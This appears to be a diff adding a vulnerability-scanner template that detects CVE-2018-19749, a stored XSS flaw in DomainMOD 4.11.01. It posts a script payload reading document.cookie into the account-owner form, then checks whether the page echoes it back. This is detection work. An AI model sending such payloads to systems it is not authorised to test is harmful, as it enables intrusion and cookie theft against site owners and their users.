@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "DomainMOD 4.11.01 存储型XSS漏洞验证：通过Owner name字段注入恶意脚本，检测页面是否存储并回显注入内容"
+id = "POC-AVE-2018-0151"
+name = "CVE-2018-19749 PoC"
+severity = "medium"
+tags = ["ave-2018-0151"]
+vuln_id = [
+    "CVE-2018-19749",
+    "AVE-2018-0151",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/assets/add/account-owner.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "owner_name=<script>alert(document.cookie)</script>&other_field=test"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(document.cookie)</script>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/assets/add/account-owner.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(document.cookie)</script>"]
